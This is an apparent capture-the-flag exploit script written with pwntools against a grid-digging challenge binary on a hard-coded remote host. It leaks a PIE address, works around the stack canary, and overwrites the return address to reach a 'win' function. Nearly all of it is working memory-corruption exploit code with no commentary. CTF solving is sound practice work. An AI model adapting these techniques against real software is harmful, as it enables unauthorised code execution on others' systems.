#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.152.242.243 --port 39047 ./chall
from pwn import *
from ctypes import CDLL
import math  

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.152.242.243'
port = int(args.PORT or 39047)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *0x0000555555401654
# b *0x0000555555401416
# b *0x0000555555400c6a
# b *0x0000555555400af8
# b *0x0000555555400a2b
# b *0x0000555555401952
continue
# c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled


row,col = 0,0
win = 0x00005555554009ea

def get_r_c():
    io.recvuntil("Position: row = ")
    row = int(io.recvuntil(",",drop=1))
    io.recvuntil(" col = ")
    col = int(io.recvline()[:-1])
    return row,col

def set(row,col,to_row,to_col):
    while(row!=to_row):
        if row > to_row:
            io.sendlineafter("> ","1")
            row-=1
        elif row < to_row:
            io.sendlineafter("> ","3")
            row+=1

    while(col!=to_col):
        if col > to_col:
            io.sendlineafter("> ","4")
            col-=1
        elif col < to_col:
            io.sendlineafter("> ","2")
            col+=1

    return row,col

def dig(choice,name):
    global cnt
    io.sendlineafter("> ", '5')
    io.recvuntil(b'Digging...\n')
    check = (io.recvline())
    # 11 canary
    if cnt < 11:
        if b'silver!\n' in check:
            io.sendlineafter(b"(1/0): ", choice)
            io.sendlineafter(b"(1/0): ", choice)
            io.sendlineafter(b"Name: ", name)
            cnt += 1
            return 1
        elif b'gold!\n' in check:
            io.sendlineafter(b"(1/0): ", choice)
            io.sendlineafter(b"(1/0): ", choice)
            io.sendlineafter(b"Name: ", name)
            cnt += 1
            return 1
        elif b'copper!\n' in check:
            io.sendlineafter(b"(1/0): ", choice)
            io.sendlineafter(b"(1/0): ", choice)
            io.sendlineafter(b"Name: ", name)
            cnt += 1
            return 1
        elif b'ladder!\n' in check:
            io.sendlineafter("> ", '2')
            return 2
    else:
        if b'Nothing' in check:
            return 0
        elif b'ladder!\n' in check:
            io.sendlineafter("> ", '2')
            return 2
        elif b'special item!\n' in check:
            io.recvuntil("item:\n")
            return 3
        else:
            if cnt < 13: # 12 rbp
                io.sendlineafter(b"(1/0): ", '1')
                io.sendlineafter(b"(1/0): ", '0')
                cnt += 1
            else:
                io.sendlineafter(b"(1/0): ", '0')
    return 0

io = start()

cnt=0
for i in range(400):
    io.sendlineafter("> ","1")
    io.sendlineafter("> ","6")

io.sendlineafter("> ","1")
row,col = get_r_c()
row,col = set(row,col,0,0)

for i in range(20):
    for j in range(20):
        row,col = set(row,col,i,j)
        lvl = dig('1','a'*8)
        if lvl==2:
            break
    if lvl==2:
        print ('berhasil')
        break

print (cnt)
row,col = get_r_c()
row,col = set(row,col,0,0)

for i in range(20):
    for j in range(20):
        row,col = set(row,col,i,j)
        lvl = dig('1','a'*8)
        if lvl==3:
            break
    if lvl==3:
        print ('berhasil')
        break

leak = int(io.recvline()[:-1],16)
print (hex(leak))
print (p64(leak))
pie = leak - 0x9ea
io.sendlineafter(b"(1/0): ", '1')
io.sendlineafter(b"(1/0): ", '1')
# io.sendlineafter(b"Name: ", p64(pie+0x9ea))
io.sendlineafter(b"Name: ", p64(leak+0x39))

row,col = get_r_c()
row,col = set(row,col,0,0)
# cnt=0

for i in range(20):
    for j in range(20):
        row,col = set(row,col,i,j)
        io.recvuntil("4. Go left\n")
        data=io.recvline()
        if "Dig" in data:
            io.sendlineafter("> ", '5')
            io.recvuntil(b'Digging...\n')
            check = (io.recvline())
            print (check)
            if "Nothing here" in check:
                data='a'
            else:
                break
    if "Dig" in data:
        break


io.sendlineafter(": ", '1')
io.sendlineafter(": ", '1')
io.sendlineafter(b"Name: ", p64(leak))
io.sendlineafter("> ", '5')

io.interactive()